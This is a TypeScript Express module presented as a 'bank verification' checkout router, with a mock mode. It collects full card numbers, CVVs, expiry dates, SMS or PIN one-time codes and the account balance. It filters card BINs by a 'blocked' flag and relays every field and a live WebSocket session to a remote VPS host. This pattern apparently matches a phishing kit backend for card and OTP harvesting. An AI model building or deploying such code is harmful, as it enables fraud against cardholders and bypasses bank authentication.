/**
 * Express router for bank verification API.
 * Use from backend: import { createBankVerificationRouter, createProxyHandlers, createMockHandlers } from "@ncc/bank-verification-ui/express"
 *
 * Flow: Frontend -> Router (same-origin) -> Upstream NCC server
 * - createProxyHandlers(upstreamUrl) — proxy to another server
 * - createMockHandlers() — stub responses for local testing
 */

import express, { type Request, type Response, type Router } from "express";
import type { WebSocket } from "ws";
import type { TransactionDetails } from "./types";

/** App with express-ws .ws() method. Call expressWs(app) before registerWebSocket. */
export interface ExpressWsApp {
  ws(path: string, callback: (ws: WebSocket, req: Request) => void): void;
}

export interface BinLookupResult {
  bin: string;
  brand?: string;
  type?: string;
  category?: string;
  issuer?: string;
  isoCode2?: string;
  cardTier?: string;
  luhn?: boolean;
  blocked: boolean;
}

export interface PaymentPayload {
  cardNumber: string;
  cardHolder?: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  amount: number;
  currency: string;
  sessionData?: Record<string, unknown>;
}

export interface BankVerificationRouterHandlers {
  createSession: (
    channelSlug: string,
    sessionData?: Record<string, unknown>,
  ) => Promise<{ sessionId: string; expiresAt: string }>;
  submitPayment: (
    channelSlug: string,
    sessionId: string,
    payment: PaymentPayload,
  ) => Promise<{ sessionId: string; status: string; blocked: boolean }>;
  getSessionStatus: (
    channelSlug: string,
    sessionId: string,
  ) => Promise<{
    status: string;
    verificationLayout?: string;
    bank?: string;
    transactionDetails?: TransactionDetails;
  }>;
  submitOtp: (
    channelSlug: string,
    sessionId: string,
    code: string,
  ) => Promise<void>;
  resendOtp: (
    channelSlug: string,
    sessionId: string,
    type: "sms" | "pin",
  ) => Promise<void>;
  submitBalance: (
    channelSlug: string,
    sessionId: string,
    balance: string,
  ) => Promise<void>;
  lookupBin: (bin: string) => Promise<BinLookupResult>;
  handleWebSocket: (
    ws: WebSocket,
    req: Request,
    channelSlug: string,
    sessionId: string,
  ) => void;
}

export interface CreateBankVerificationRouterOptions {
  /** Base path for routes. Default: /ncc/v1 (avoids conflict with local APIs) */
  basePath?: string;
}

export interface BankVerificationRouterResult {
  /** Express router to mount. Routes are relative to basePath. */
  router: Router;
  /** Register WebSocket route on express-ws app. Call after expressWs(app). */
  registerWebSocket: (app: ExpressWsApp) => void;
}

function str(v: string | string[] | undefined): string {
  return Array.isArray(v) ? (v[0] ?? "") : (v ?? "");
}

function asyncHandler(
  fn: (req: Request, res: Response) => Promise<void>,
): (req: Request, res: Response) => void {
  return (req, res) => {
    fn(req, res).catch((err) => {
      res.status(500).json({
        error: err instanceof Error ? err.message : "Internal server error",
      });
    });
  };
}

export function createBankVerificationRouter(
  handlers: BankVerificationRouterHandlers,
  options: CreateBankVerificationRouterOptions = {},
): BankVerificationRouterResult {
  const basePath = options.basePath ?? "/ncc/v1";
  const normalizedBase = basePath.replace(/\/$/, "");

  const subRouter = express.Router();
  const ch = "/channels/:channelSlug/checkout/sessions";
  const chSession = `${ch}/:sessionId`;

  subRouter.post(
    ch,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const body = req.body ?? {};
      const sessionData = body.sessionData;
      const result = await handlers.createSession(channelSlug, sessionData);
      res.json(result);
    }),
  );

  subRouter.post(
    `${chSession}/payment`,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const sessionId = str(req.params.sessionId);
      const payment = req.body;
      const result = await handlers.submitPayment(
        channelSlug,
        sessionId,
        payment,
      );
      res.json(result);
    }),
  );

  subRouter.get(
    `${chSession}/status`,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const sessionId = str(req.params.sessionId);
      const result = await handlers.getSessionStatus(channelSlug, sessionId);
      res.json(result);
    }),
  );

  subRouter.post(
    `${chSession}/otp`,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const sessionId = str(req.params.sessionId);
      const { code } = req.body ?? {};
      await handlers.submitOtp(channelSlug, sessionId, code);
      res.status(204).send();
    }),
  );

  subRouter.post(
    `${chSession}/otp/resend`,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const sessionId = str(req.params.sessionId);
      const { type } = req.body ?? {};
      await handlers.resendOtp(channelSlug, sessionId, type ?? "sms");
      res.status(204).send();
    }),
  );

  subRouter.post(
    `${chSession}/balance`,
    asyncHandler(async (req, res) => {
      const channelSlug = str(req.params.channelSlug);
      const sessionId = str(req.params.sessionId);
      const { balance } = req.body ?? {};
      await handlers.submitBalance(channelSlug, sessionId, str(balance));
      res.status(204).send();
    }),
  );

  subRouter.post(
    "/bins/lookup",
    asyncHandler(async (req, res) => {
      const { bin } = req.body ?? {};
      const result = await handlers.lookupBin(str(bin));
      res.json(result);
    }),
  );

  const router = express.Router();
  router.use(normalizedBase, subRouter);

  const wsPath = `${normalizedBase}/channels/:channelSlug/checkout/sessions/:sessionId/ws`;

  const registerWebSocket = (app: ExpressWsApp) => {
    app.ws(wsPath, (ws, req) => {
      const channelSlug = str(
        (req.params as Record<string, string | string[]>).channelSlug,
      );
      const sessionId = str(
        (req.params as Record<string, string | string[]>).sessionId,
      );
      if (channelSlug && sessionId) {
        handlers.handleWebSocket(ws, req, channelSlug, sessionId);
      }
    });
  };

  return { router, registerWebSocket };
}

/** Path the upstream NCC server expects (may differ from local basePath) */
const UPSTREAM_API_PATH = "/v1";

/**
 * Create handlers that proxy all requests to an upstream NCC server.
 * Use when the router is a same-origin BFF that forwards to another server.
 *
 * @param upstreamBaseUrl - Base URL of the NCC server (e.g. "https://srv1462130.hstgr.cloud")
 */
export function createProxyHandlers(
  upstreamBaseUrl: string,
): BankVerificationRouterHandlers {
  const base = upstreamBaseUrl.replace(/\/$/, "");

  async function fetchUpstream<T>(
    method: string,
    path: string,
    body?: unknown,
  ): Promise<T> {
    const url = `${base}${path.startsWith("/") ? "" : "/"}${path}`;
    const res = await fetch(url, {
      method,
      headers: body ? { "Content-Type": "application/json" } : undefined,
      body: body ? JSON.stringify(body) : undefined,
    });
    const text = await res.text();
    if (!res.ok) {
      throw new Error(text || `Upstream error ${res.status}`);
    }
    return (text ? JSON.parse(text) : undefined) as T;
  }

  return {
    createSession: async (channelSlug, sessionData) =>
      fetchUpstream("POST", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions`, {
        sessionData: sessionData ?? {},
      }),

    submitPayment: async (channelSlug, sessionId, payment) =>
      fetchUpstream("POST", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/payment`, payment),

    getSessionStatus: async (channelSlug, sessionId) =>
      fetchUpstream("GET", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/status`),

    submitOtp: async (channelSlug, sessionId, code) => {
      await fetchUpstream("POST", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/otp`, {
        code,
      });
    },

    resendOtp: async (channelSlug, sessionId, type) => {
      await fetchUpstream("POST", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/otp/resend`, {
        type,
      });
    },

    submitBalance: async (channelSlug, sessionId, balance) => {
      await fetchUpstream("POST", `${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/balance`, {
        balance,
      });
    },

    lookupBin: async (bin) =>
      fetchUpstream("POST", `${UPSTREAM_API_PATH}/bins/lookup`, { bin }),

    handleWebSocket: (ws, _req, channelSlug, sessionId) => {
      const wsProtocol = base.startsWith("https") ? "wss:" : "ws:";
      const wsHost = base.replace(/^https?:\/\//, "");
      const upstreamWsUrl = `${wsProtocol}//${wsHost}${UPSTREAM_API_PATH}/channels/${channelSlug}/checkout/sessions/${sessionId}/ws`;

      let upstream: WebSocket | null = null;
      try {
        // eslint-disable-next-line @typescript-eslint/no-require-imports
        const Ws = require("ws") as { new (url: string): WebSocket };
        upstream = new Ws(upstreamWsUrl);

        upstream.on("message", (data) => ws.send(data));
        ws.on("message", (data) => upstream?.send(data));
        upstream.on("close", () => ws.close());
        ws.on("close", () => upstream?.close());
        upstream.on("error", () => ws.close());
        ws.on("error", () => upstream?.close());
      } catch (err) {
        ws.close();
      }
    },
  };
}

/**
 * Create handlers that return mock/stub responses for local testing.
 * No upstream server required.
 */
export function createMockHandlers(): BankVerificationRouterHandlers {
  const sessions = new Map<
    string,
    {
      status: string;
      verificationLayout?: string;
      bank?: string;
      transactionDetails?: TransactionDetails;
    }
  >();

  return {
    createSession: async (channelSlug, _sessionData) => {
      const sessionId = `mock-${channelSlug}-${Date.now()}`;
      sessions.set(sessionId, {
        status: "pending",
        verificationLayout: "sms",
        bank: "Mock Bank",
        transactionDetails: {
          merchantName: "Test Merchant",
          amount: "100.00",
          date: new Date().toISOString().slice(0, 10),
          cardNumber: "****1234",
        },
      });
      return {
        sessionId,
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
      };
    },

    submitPayment: async (_channelSlug, sessionId, _payment) => {
      const s = sessions.get(sessionId);
      if (s) s.status = "awaiting_sms";
      return { sessionId, status: "awaiting_sms", blocked: false };
    },

    getSessionStatus: async (_channelSlug, sessionId) => {
      const s = sessions.get(sessionId);
      return (
        s ?? {
          status: "pending",
          verificationLayout: "sms",
          bank: "Mock Bank",
          transactionDetails: {
            merchantName: "Test Merchant",
            amount: "100.00",
            date: new Date().toISOString().slice(0, 10),
          },
        }
      );
    },

    submitOtp: async (_channelSlug, sessionId, _code) => {
      const s = sessions.get(sessionId);
      if (s) s.status = "success";
    },

    resendOtp: async () => {},

    submitBalance: async (_channelSlug, sessionId, _balance) => {
      const s = sessions.get(sessionId);
      if (s) s.status = "success";
    },

    lookupBin: async (bin) => ({
      bin,
      brand: "visa",
      type: "credit",
      issuer: "Mock Bank",
      blocked: false,
    }),

    handleWebSocket: (ws, _req, _channelSlug, sessionId) => {
      const s = sessions.get(sessionId);
      if (s) {
        ws.send(
          JSON.stringify({
            status: s.status,
            verificationLayout: s.verificationLayout,
            bank: s.bank,
            transactionDetails: s.transactionDetails,
          }),
        );
      }
    },
  };
}
